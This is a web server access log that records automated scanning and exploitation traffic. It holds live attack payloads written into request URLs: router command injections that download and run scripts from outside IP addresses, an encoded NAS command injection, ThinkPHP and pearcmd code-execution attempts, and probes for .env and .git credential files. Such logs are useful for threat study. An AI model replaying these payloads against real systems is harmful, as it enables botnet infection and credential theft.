INFO:     45.148.10.202:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60) HTTP/1.0" 200 OK
INFO:     45.148.10.202:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+wget.sh%3B+wget+http%3A%2F%2F87.121.112.42%2Fwget.sh%3B+chmod+777+wget.sh%3B+.%2Fwget.sh+tplink%3B+rm+-rf+wget.sh%60) HTTP/1.0" 200 OK
INFO:     13.91.165.67:0 - "GET /manager/text/list HTTP/1.0" 200 OK
INFO:     185.191.126.213:0 - "GET / HTTP/1.0" 200 OK
INFO:     162.216.149.56:0 - "GET / HTTP/1.0" 200 OK
INFO:     94.156.68.162:0 - "GET /_profiler/phpinfo HTTP/1.0" 200 OK
INFO:     36.139.5.209:0 - "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     36.139.5.209:0 - "GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     36.139.5.209:0 - "GET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     36.139.5.209:0 - "GET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     36.139.5.209:0 - "GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.0" 200 OK
INFO:     36.139.5.209:0 - "GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     36.139.5.209:0 - "GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     36.139.5.209:0 - "GET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     36.139.5.209:0 - "GET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     36.139.5.209:0 - "GET /phpunit/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     36.139.5.209:0 - "GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     36.139.5.209:0 - "GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     36.139.5.209:0 - "GET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     36.139.5.209:0 - "GET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     36.139.5.209:0 - "GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     36.139.5.209:0 - "GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     36.139.5.209:0 - "GET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     36.139.5.209:0 - "GET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     36.139.5.209:0 - "GET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     36.139.5.209:0 - "GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     36.139.5.209:0 - "GET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     36.139.5.209:0 - "GET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     36.139.5.209:0 - "GET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     36.139.5.209:0 - "GET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     36.139.5.209:0 - "GET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     36.139.5.209:0 - "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 404 Not Found
INFO:     36.139.5.209:0 - "GET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     36.139.5.209:0 - "GET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     36.139.5.209:0 - "GET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     36.139.5.209:0 - "GET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     36.139.5.209:0 - "GET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     36.139.5.209:0 - "GET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     36.139.5.209:0 - "GET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     36.139.5.209:0 - "GET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     36.139.5.209:0 - "GET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     36.139.5.209:0 - "GET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     36.139.5.209:0 - "GET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     36.139.5.209:0 - "GET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.0" 200 OK
INFO:     36.139.5.209:0 - "GET /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.0" 200 OK
INFO:     36.139.5.209:0 - "GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"));?>+/tmp/index1.php HTTP/1.0" 200 OK
INFO:     36.139.5.209:0 - "GET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.0" 200 OK
INFO:     185.191.126.213:0 - "GET / HTTP/1.0" 200 OK
INFO:     185.224.128.43:0 - "GET / HTTP/1.0" 200 OK
INFO:     77.237.163.67:0 - "GET / HTTP/1.0" 200 OK
INFO:     141.98.11.189:0 - "GET / HTTP/1.0" 200 OK
INFO:     185.191.126.213:0 - "GET / HTTP/1.0" 200 OK
INFO:     74.82.62.135:0 - "GET / HTTP/1.0" 200 OK
INFO:     185.191.126.213:0 - "GET / HTTP/1.0" 200 OK
INFO:     198.235.24.48:0 - "GET / HTTP/1.0" 200 OK
INFO:     46.19.143.26:0 - "POST /boaform/admin/formLogin HTTP/1.0" 405 Method Not Allowed
INFO:     185.191.126.213:0 - "GET / HTTP/1.0" 200 OK
INFO:     20.127.146.25:0 - "GET /.env HTTP/1.0" 404 Not Found
INFO:     20.127.146.25:0 - "POST / HTTP/1.0" 405 Method Not Allowed
INFO:     185.191.126.213:0 - "GET / HTTP/1.0" 200 OK
INFO:     92.249.48.202:0 - "GET / HTTP/1.0" 200 OK
INFO:     117.245.209.158:0 - "GET / HTTP/1.0" 200 OK
INFO:     141.98.11.189:0 - "GET / HTTP/1.0" 200 OK
INFO:     185.191.126.213:0 - "GET / HTTP/1.0" 200 OK
INFO:     66.240.236.116:0 - "GET / HTTP/1.0" 200 OK
INFO:     218.103.163.211:0 - "GET / HTTP/1.0" 200 OK
INFO:     94.156.68.162:0 - "GET /.git/config HTTP/1.0" 200 OK
INFO:     34.76.158.233:0 - "GET / HTTP/1.0" 200 OK
INFO:     91.92.246.103:0 - "GET /.git/config HTTP/1.0" 200 OK
INFO:     2.62.146.70:0 - "GET / HTTP/1.0" 200 OK
INFO:     2.62.146.70:0 - "GET /css/2.5b37d44a.chunk.css HTTP/1.0" 200 OK
INFO:     2.62.146.70:0 - "GET /css/main.0b8f9a9b.chunk.css HTTP/1.0" 200 OK
INFO:     2.62.146.70:0 - "GET /js/2.c7557a74.chunk.js HTTP/1.0" 200 OK
INFO:     2.62.146.70:0 - "GET /js/main.c3b195bc.chunk.js HTTP/1.0" 200 OK
INFO:     2.62.146.70:0 - "GET /favicon.ico HTTP/1.0" 200 OK
INFO:     2.62.146.70:0 - "GET /media/logo_small.4204397d.svg HTTP/1.0" 200 OK
INFO:     2.62.146.70:0 - "GET /api/v1/workspaces HTTP/1.0" 401 Unauthorized
INFO:     2.62.146.70:0 - "GET /api/v1/info HTTP/1.0" 200 OK
INFO:     2.62.146.70:0 - "GET /media/Rubik-Medium.c87313aa.ttf HTTP/1.0" 200 OK
INFO:     2.62.146.70:0 - "GET /media/Rubik-Regular.b3d0902b.ttf HTTP/1.0" 200 OK
INFO:     2.62.146.70:0 - "GET /api/v1/info HTTP/1.0" 200 OK
INFO:     46.19.143.26:0 - "GET / HTTP/1.0" 200 OK
INFO:     45.148.10.202:0 - "GET / HTTP/1.0" 200 OK
INFO:     64.62.197.119:0 - "GET / HTTP/1.0" 200 OK
INFO:     64.62.197.108:0 - "GET /webui/ HTTP/1.0" 200 OK
INFO:     64.62.197.114:0 - "GET /favicon.ico HTTP/1.0" 200 OK
INFO:     64.62.197.107:0 - "GET /geoserver/web/ HTTP/1.0" 200 OK
INFO:     141.98.11.189:0 - "GET / HTTP/1.0" 200 OK
INFO:     46.174.191.31:0 - "GET / HTTP/1.0" 200 OK
INFO:     185.191.126.213:0 - "GET / HTTP/1.0" 200 OK
INFO:     84.54.51.37:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+r%3B+wget+http%3A%2F%2F74.50.81.158%2Fr%3B+chmod+777+r%3B+.%2Fr+tplink%3B+rm+-rf+r%60) HTTP/1.0" 200 OK
INFO:     52.228.152.151:0 - "GET / HTTP/1.0" 200 OK
INFO:     83.97.73.245:0 - "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.0" 200 OK
INFO:     14.116.254.172:0 - "GET / HTTP/1.0" 200 OK
INFO:     87.236.176.62:0 - "GET / HTTP/1.0" 200 OK
INFO:     45.148.10.202:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60) HTTP/1.0" 200 OK
INFO:     45.148.10.202:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+wget.sh%3B+wget+http%3A%2F%2F87.121.112.42%2Fwget.sh%3B+chmod+777+wget.sh%3B+.%2Fwget.sh+tplink%3B+rm+-rf+wget.sh%60) HTTP/1.0" 200 OK
INFO:     93.179.198.59:0 - "GET / HTTP/1.0" 200 OK
INFO:     83.97.73.245:0 - "GET /actuator/gateway/routes HTTP/1.0" 200 OK
INFO:     41.164.76.27:0 - "GET / HTTP/1.0" 200 OK
INFO:     106.75.175.181:0 - "GET /.git/config HTTP/1.0" 200 OK
INFO:     92.249.48.202:0 - "GET / HTTP/1.0" 200 OK
INFO:     186.96.31.46:0 - "GET / HTTP/1.0" 200 OK
INFO:     186.96.31.46:0 - "GET /HNAP1/ HTTP/1.0" 200 OK
INFO:     43.248.50.126:0 - "GET / HTTP/1.0" 200 OK
INFO:     205.210.31.244:0 - "GET / HTTP/1.0" 200 OK
INFO:     141.98.11.189:0 - "GET / HTTP/1.0" 200 OK
INFO:     141.98.11.189:0 - "GET / HTTP/1.0" 200 OK
INFO:     141.98.11.189:0 - "GET / HTTP/1.0" 200 OK
INFO:     45.148.10.202:0 - "GET / HTTP/1.0" 200 OK
INFO:     77.249.219.182:0 - "GET /login?route=%2Fworkspaces%2Fdefault%3F HTTP/1.0" 200 OK
INFO:     77.249.219.182:0 - "GET /css/main.0b8f9a9b.chunk.css HTTP/1.0" 200 OK
INFO:     77.249.219.182:0 - "GET /css/2.5b37d44a.chunk.css HTTP/1.0" 200 OK
INFO:     77.249.219.182:0 - "GET /js/main.c3b195bc.chunk.js HTTP/1.0" 200 OK
INFO:     77.249.219.182:0 - "GET /js/2.c7557a74.chunk.js HTTP/1.0" 200 OK
INFO:     77.249.219.182:0 - "GET /api/v1/info HTTP/1.0" 200 OK
INFO:     77.249.219.182:0 - "GET /media/Rubik-Medium.c87313aa.ttf HTTP/1.0" 200 OK
INFO:     77.249.219.182:0 - "GET /media/Rubik-Regular.b3d0902b.ttf HTTP/1.0" 200 OK
INFO:     185.191.126.213:0 - "GET / HTTP/1.0" 200 OK
INFO:     161.35.38.78:0 - "GET /.env HTTP/1.0" 404 Not Found
INFO:     161.35.38.78:0 - "POST / HTTP/1.0" 405 Method Not Allowed
INFO:     34.77.126.178:0 - "GET / HTTP/1.0" 200 OK
INFO:     172.212.60.227:0 - "GET /portal/redlion HTTP/1.0" 200 OK
INFO:     45.148.10.202:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60) HTTP/1.0" 200 OK
INFO:     45.148.10.202:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+wget.sh%3B+wget+http%3A%2F%2F87.121.112.42%2Fwget.sh%3B+chmod+777+wget.sh%3B+.%2Fwget.sh+tplink%3B+rm+-rf+wget.sh%60) HTTP/1.0" 200 OK
INFO:     46.19.143.26:0 - "GET / HTTP/1.0" 200 OK
INFO:     45.86.86.249:0 - "GET /.env HTTP/1.0" 404 Not Found
INFO:     45.86.86.249:0 - "GET /?%3Cplay%3Ewithme%3C/%3E HTTP/1.0" 200 OK
INFO:     45.86.86.249:0 - "POST / HTTP/1.0" 405 Method Not Allowed
INFO:     45.86.86.249:0 - "POST / HTTP/1.0" 405 Method Not Allowed
INFO:     61.3.98.217:0 - "GET /boaform/admin/formLogin?username=adminisp&psd=adminisp HTTP/1.0" 200 OK
INFO:     4.172.201.198:0 - "GET / HTTP/1.0" 200 OK
INFO:     87.121.69.24:0 - "GET / HTTP/1.0" 200 OK
INFO:     200.105.245.114:0 - "GET / HTTP/1.0" 200 OK
INFO:     45.148.10.202:0 - "GET / HTTP/1.0" 200 OK
INFO:     141.98.11.189:0 - "GET / HTTP/1.0" 200 OK
INFO:     87.121.69.24:0 - "GET / HTTP/1.0" 200 OK
INFO:     141.98.11.189:0 - "GET / HTTP/1.0" 200 OK
INFO:     92.249.48.202:0 - "GET / HTTP/1.0" 200 OK
INFO:     84.54.51.37:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+r%3B+wget+http%3A%2F%2F74.50.81.158%2Fr%3B+chmod+777+r%3B+.%2Fr+tplink%3B+rm+-rf+r%60) HTTP/1.0" 200 OK
INFO:     45.148.10.202:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60) HTTP/1.0" 200 OK
INFO:     45.148.10.202:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+wget.sh%3B+wget+http%3A%2F%2F87.121.112.42%2Fwget.sh%3B+chmod+777+wget.sh%3B+.%2Fwget.sh+tplink%3B+rm+-rf+wget.sh%60) HTTP/1.0" 200 OK
INFO:     185.191.126.213:0 - "GET / HTTP/1.0" 200 OK
INFO:     45.142.182.78:0 - "GET / HTTP/1.0" 200 OK
INFO:     185.150.26.220:0 - "GET / HTTP/1.0" 200 OK
INFO:     46.19.143.26:0 - "GET / HTTP/1.0" 200 OK
INFO:     188.51.164.12:0 - "GET / HTTP/1.0" 200 OK
INFO:     147.185.132.150:0 - "GET / HTTP/1.0" 200 OK
INFO:     185.191.126.213:0 - "GET / HTTP/1.0" 200 OK
INFO:     185.191.126.213:0 - "GET / HTTP/1.0" 200 OK
INFO:     91.92.250.118:0 - "GET /.env HTTP/1.0" 404 Not Found
INFO:     91.92.250.118:0 - "POST / HTTP/1.0" 405 Method Not Allowed
INFO:     94.102.56.99:0 - "GET / HTTP/1.0" 200 OK
INFO:     179.43.139.194:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60killall+-9+telnetdbot%3B+cd+%2Ftmp%3B+rm+-rf+wget.sh%3B+wget+http%3A%2F%2F190.97.165.119%2Fwget.sh%3B+chmod+777+wget.sh%3B+.%2Fwget.sh+tplink%3B+rm+-rf+wget.sh%60) HTTP/1.0" 200 OK
INFO:     185.191.126.213:0 - "GET / HTTP/1.0" 200 OK
INFO:     185.191.126.213:0 - "GET / HTTP/1.0" 200 OK
INFO:     95.142.121.17:0 - "GET /.env HTTP/1.0" 404 Not Found
INFO:     95.142.121.17:0 - "GET /api/.env HTTP/1.0" 404 Not Found
INFO:     95.142.121.17:0 - "GET /.env.example HTTP/1.0" 404 Not Found
INFO:     95.142.121.17:0 - "GET /API/.env HTTP/1.0" 200 OK
INFO:     95.142.121.17:0 - "GET /_profiler/phpinfo HTTP/1.0" 200 OK
INFO:     95.142.121.17:0 - "GET /admin/.env HTTP/1.0" 200 OK
INFO:     95.142.121.17:0 - "GET /.env.sample HTTP/1.0" 404 Not Found
INFO:     95.142.121.17:0 - "GET /core/.env HTTP/1.0" 200 OK
INFO:     95.142.121.17:0 - "GET /server/.env HTTP/1.0" 200 OK
INFO:     95.142.121.17:0 - "GET /vendor/.env HTTP/1.0" 200 OK
INFO:     95.142.121.17:0 - "GET /lib/.env HTTP/1.0" 200 OK
INFO:     95.142.121.17:0 - "GET /cronlab/.env HTTP/1.0" 200 OK
INFO:     95.142.121.17:0 - "GET /database/.env HTTP/1.0" 200 OK
INFO:     95.142.121.17:0 - "GET /config/.env HTTP/1.0" 200 OK
INFO:     95.142.121.17:0 - "GET /assets/.env HTTP/1.0" 200 OK
INFO:     95.142.121.17:0 - "GET /app/.env HTTP/1.0" 200 OK
INFO:     95.142.121.17:0 - "GET /apps/.env HTTP/1.0" 200 OK
INFO:     95.142.121.17:0 - "GET /uploads/.env HTTP/1.0" 200 OK
INFO:     95.142.121.17:0 - "GET /cgi-bin HTTP/1.0" 404 Not Found
INFO:     95.142.121.17:0 - "GET /sitemaps/.env HTTP/1.0" 200 OK
INFO:     95.142.121.17:0 - "GET /site/.env HTTP/1.0" 200 OK
INFO:     95.142.121.17:0 - "GET /web/.env HTTP/1.0" 200 OK
INFO:     95.142.121.17:0 - "GET /public/.env HTTP/1.0" 200 OK
INFO:     95.142.121.17:0 - "GET /en/.env HTTP/1.0" 200 OK
INFO:     95.142.121.17:0 - "GET /tools/.env HTTP/1.0" 200 OK
INFO:     95.142.121.17:0 - "GET /v1/.env HTTP/1.0" 200 OK
INFO:     95.142.121.17:0 - "GET /administrator/.env HTTP/1.0" 200 OK
INFO:     185.224.128.43:0 - "GET / HTTP/1.0" 200 OK
INFO:     95.142.121.17:0 - "GET /laravel/.env HTTP/1.0" 200 OK
INFO:     95.142.121.17:0 - "GET /.environment HTTP/1.0" 404 Not Found
INFO:     95.142.121.17:0 - "GET /cgi-bin/phpinfo.php HTTP/1.0" 200 OK
INFO:     95.142.121.17:0 - "GET /phpinfo HTTP/1.0" 404 Not Found
INFO:     95.142.121.17:0 - "GET /info.php HTTP/1.0" 404 Not Found
INFO:     95.142.121.17:0 - "GET /twilio/.env HTTP/1.0" 200 OK
INFO:     85.104.56.192:0 - "GET / HTTP/1.0" 200 OK
INFO:     141.98.11.189:0 - "GET / HTTP/1.0" 200 OK
INFO:     92.114.59.139:0 - "GET /manager/html HTTP/1.0" 200 OK
INFO:     159.203.167.77:0 - "GET / HTTP/1.0" 200 OK
INFO:     159.203.167.77:0 - "GET /form.html HTTP/1.0" 404 Not Found
INFO:     159.203.167.77:0 - "GET /upl.php HTTP/1.0" 404 Not Found
INFO:     159.203.167.77:0 - "GET /geoip/ HTTP/1.0" 200 OK
INFO:     159.203.167.77:0 - "GET /favicon.ico HTTP/1.0" 200 OK
INFO:     159.203.167.77:0 - "GET /1.php HTTP/1.0" 404 Not Found
INFO:     159.203.167.77:0 - "GET /bundle.js HTTP/1.0" 404 Not Found
INFO:     159.203.167.77:0 - "GET /files/ HTTP/1.0" 200 OK
INFO:     159.203.167.77:0 - "GET /systembc/password.php HTTP/1.0" 200 OK
INFO:     159.203.167.77:0 - "GET /password.php HTTP/1.0" 404 Not Found
INFO:     159.203.167.77:0 - "GET /info.php HTTP/1.0" 404 Not Found
INFO:     92.249.48.202:0 - "GET / HTTP/1.0" 200 OK
INFO:     207.231.105.76:0 - "GET /.env HTTP/1.0" 404 Not Found
INFO:     207.231.105.76:0 - "POST / HTTP/1.0" 405 Method Not Allowed
INFO:     185.191.126.213:0 - "GET / HTTP/1.0" 200 OK
INFO:     46.19.143.26:0 - "GET / HTTP/1.0" 200 OK
INFO:     185.191.126.213:0 - "GET / HTTP/1.0" 200 OK
INFO:     183.240.253.206:0 - "GET /boaform/admin/formLogin?username=adminisp&psd=adminisp HTTP/1.0" 200 OK
INFO:     45.148.10.202:0 - "GET / HTTP/1.0" 200 OK
INFO:     185.191.126.213:0 - "GET / HTTP/1.0" 200 OK
INFO:     185.191.126.213:0 - "GET / HTTP/1.0" 200 OK
INFO:     185.191.126.213:0 - "GET / HTTP/1.0" 200 OK
INFO:     34.125.168.154:0 - "GET / HTTP/1.0" 200 OK
INFO:     84.54.51.37:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+r%3B+wget+http%3A%2F%2F74.50.81.158%2Fr%3B+chmod+777+r%3B+.%2Fr+tplink%3B+rm+-rf+r%60) HTTP/1.0" 200 OK
INFO:     185.191.126.213:0 - "GET / HTTP/1.0" 200 OK
INFO:     185.191.126.213:0 - "GET / HTTP/1.0" 200 OK
INFO:     206.168.34.44:0 - "GET / HTTP/1.0" 200 OK
INFO:     206.168.34.44:0 - "GET /favicon.ico HTTP/1.0" 200 OK
INFO:     141.98.11.189:0 - "GET / HTTP/1.0" 200 OK
INFO:     45.148.10.202:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60) HTTP/1.0" 200 OK
INFO:     45.148.10.202:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+wget.sh%3B+wget+http%3A%2F%2F87.121.112.42%2Fwget.sh%3B+chmod+777+wget.sh%3B+.%2Fwget.sh+tplink%3B+rm+-rf+wget.sh%60) HTTP/1.0" 200 OK
INFO:     185.150.26.220:0 - "GET / HTTP/1.0" 200 OK
INFO:     141.98.10.12:0 - "GET / HTTP/1.0" 200 OK
INFO:     141.98.10.12:0 - "POST /HNAP1/ HTTP/1.0" 405 Method Not Allowed
INFO:     64.62.197.71:0 - "GET / HTTP/1.0" 200 OK
INFO:     64.62.197.64:0 - "GET /webui/ HTTP/1.0" 200 OK
INFO:     64.62.197.65:0 - "GET /favicon.ico HTTP/1.0" 200 OK
INFO:     64.62.197.68:0 - "GET /geoserver/web/ HTTP/1.0" 200 OK
INFO:     35.203.210.203:0 - "GET / HTTP/1.0" 200 OK
INFO:     192.227.190.158:0 - "GET /cgi-bin/nas_sharing.cgi HTTP/1.0" 200 OK
INFO:     149.50.103.48:0 - "GET / HTTP/1.0" 200 OK
INFO:     185.191.126.213:0 - "GET / HTTP/1.0" 200 OK
INFO:     91.92.241.222:0 - "GET /.git/config HTTP/1.0" 200 OK
INFO:     162.142.125.218:0 - "GET / HTTP/1.0" 200 OK
INFO:     162.142.125.218:0 - "GET / HTTP/1.0" 200 OK
INFO:     162.142.125.218:0 - "GET /favicon.ico HTTP/1.0" 200 OK
INFO:     185.224.128.43:0 - "GET / HTTP/1.0" 200 OK
INFO:     78.153.140.179:0 - "GET /.env HTTP/1.0" 404 Not Found
INFO:     190.108.234.254:0 - "GET / HTTP/1.0" 200 OK
INFO:     46.19.143.26:0 - "GET / HTTP/1.0" 200 OK
INFO:     45.148.10.202:0 - "GET / HTTP/1.0" 200 OK
INFO:     91.92.246.103:0 - "GET /.git/config HTTP/1.0" 200 OK
INFO:     92.249.48.202:0 - "GET / HTTP/1.0" 200 OK
INFO:     142.93.190.56:0 - "GET / HTTP/1.0" 200 OK
INFO:     142.93.190.56:0 - "GET / HTTP/1.0" 200 OK
INFO:     142.93.190.56:0 - "GET /favicon.ico HTTP/1.0" 200 OK
INFO:     192.227.190.158:0 - "GET /cgi-bin/nas_sharing.cgi HTTP/1.0" 200 OK
INFO:     192.227.190.158:0 - "GET /cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=ZWNobwktZQlcXHg2ZFxceDc2XFx4MjBcXHgyZlxceDc2XFx4NjFcXHg3MlxceDJmXFx4NzdcXHg3N1xceDc3XFx4MmZcXHg2M1xceDY3XFx4NjlcXHgyZFxceDYyXFx4NjlcXHg2ZVxceDJmXFx4NmVcXHg2MVxceDczXFx4NWZcXHg3M1xceDY4XFx4NjFcXHg3MlxceDY5XFx4NmVcXHg2N1xceDJlXFx4NjNcXHg2N1xceDY5XFx4MjBcXHgyZlxceDc2XFx4NjFcXHg3MlxceDJmXFx4NzdcXHg3N1xceDc3XFx4MmZcXHg2M1xceDY3XFx4NjlcXHgyZFxceDYyXFx4NjlcXHg2ZVxceDJmXFx4NzRcXHg3MlxceDc1XFx4NmRcXHg3MFxceDJlXFx4NjNcXHg2N1xceDY5XFx4M2JcXHg2Y1xceDczfHNo HTTP/1.0" 200 OK
INFO:     83.97.73.245:0 - "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.0" 200 OK
INFO:     84.54.51.37:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+r%3B+wget+http%3A%2F%2F74.50.81.158%2Fr%3B+chmod+777+r%3B+.%2Fr+tplink%3B+rm+-rf+r%60) HTTP/1.0" 200 OK
INFO:     83.97.73.245:0 - "GET /actuator/gateway/routes HTTP/1.0" 200 OK
INFO:     4.156.21.37:0 - "GET /hudson HTTP/1.0" 404 Not Found
INFO:     13.64.111.117:0 - "GET / HTTP/1.0" 200 OK
INFO:     185.191.126.213:0 - "GET / HTTP/1.0" 200 OK
INFO:     161.35.148.245:0 - "GET / HTTP/1.0" 200 OK
INFO:     149.50.103.48:0 - "GET / HTTP/1.0" 200 OK
